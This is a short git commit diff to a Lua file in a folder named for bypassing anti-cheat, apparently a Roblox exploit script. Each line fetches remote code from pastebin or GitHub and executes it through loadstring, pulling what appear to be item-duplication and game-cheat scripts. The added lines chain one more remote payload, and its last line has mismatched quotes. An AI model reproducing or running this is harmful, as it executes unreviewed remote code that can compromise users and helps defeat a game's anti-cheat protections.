6d64ee795d46a5de431d845d8bb96fe3368c4c2e
RENBex6969 <109706035+RENBex6969@users.noreply.github.com>
2023-01-04 13:24:13 +0800

    Update .lua

--- InfiniteHub/BYPASSANTICHEAT/.lua
+++ InfiniteHub/BYPASSANTICHEAT/.lua
@@ -3,3 +3,7 @@ loadstring(game:HttpGet('https://pastebin.com/raw/mQ12eBCd'))()
 
 _G.Username = "ML_DrakenChou"
 loadstring(game:HttpGet("https://raw.githubusercontent.com/SilenceScripts/Centai/main/Duplication.string"))()
+
+wait(12)
+_L.Name = "ML_DrakenChou"
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Prezleyx/PSX-SCRIPT-V2-/main/PSX%20SCRIPT"))()
